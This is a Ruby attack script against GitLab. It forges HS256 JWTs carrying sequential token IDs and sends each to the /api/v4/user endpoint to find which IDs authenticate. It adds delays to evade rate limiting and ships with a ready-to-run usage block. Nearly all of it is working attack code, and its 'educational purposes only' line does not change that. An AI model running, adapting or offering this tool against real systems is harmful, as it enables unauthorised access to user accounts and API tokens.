#!/usr/bin/env ruby

# Token ID Enumeration Attack Script
# This demonstrates how an attacker might brute force token IDs

require 'net/http'
require 'json'
require 'jwt'

class TokenIDEnumerator
  def initialize(gitlab_url, jwt_secret)
    @gitlab_url = gitlab_url
    @jwt_secret = jwt_secret
    @found_tokens = []
  end

  def enumerate_token_ids(start_id, end_id)
    puts "=== Enumerating Token IDs from #{start_id} to #{end_id} ==="
    
    (start_id..end_id).each do |token_id|
      if test_token_id(token_id)
        @found_tokens << token_id
        puts "✅ Found valid token ID: #{token_id}"
      end
      
      # Add delay to avoid rate limiting
      sleep(0.1)
    end
    
    puts "\n=== Enumeration Complete ==="
    puts "Found #{@found_tokens.length} valid token IDs: #{@found_tokens.join(', ')}"
  end

  private

  def test_token_id(token_id)
    # Create JWT token with the token ID
    payload = {
      'token' => token_id,
      'iat' => Time.now.to_i,
      'exp' => Time.now.to_i + 3600
    }
    
    jwt_token = JWT.encode(payload, @jwt_secret, 'HS256')
    
    # Test the JWT token
    response = make_api_request(jwt_token)
    
    # If we get a 200 response, the token ID is valid
    return response.code == '200'
  rescue => e
    # Log errors but continue enumeration
    puts "Error testing token ID #{token_id}: #{e.message}"
    return false
  end

  def make_api_request(jwt_token)
    uri = URI("#{@gitlab_url}/api/v4/user")
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    
    request = Net::HTTP::Get.new(uri)
    request['Authorization'] = "Bearer #{jwt_token}"
    request['Content-Type'] = 'application/json'
    
    http.request(request)
  end
end

# Usage example
if __FILE__ == $0
  puts "=== Token ID Enumeration Attack Demo ==="
  puts "WARNING: This is for educational purposes only!"
  puts "Only use on systems you own or have permission to test."
  puts
  
  # Configuration
  gitlab_url = "http://gitlab.local"
  jwt_secret = "your-jwt-secret-here"
  
  # Enumeration range (be conservative to avoid overwhelming the server)
  start_id = 1
  end_id = 100
  
  enumerator = TokenIDEnumerator.new(gitlab_url, jwt_secret)
  enumerator.enumerate_token_ids(start_id, end_id)
end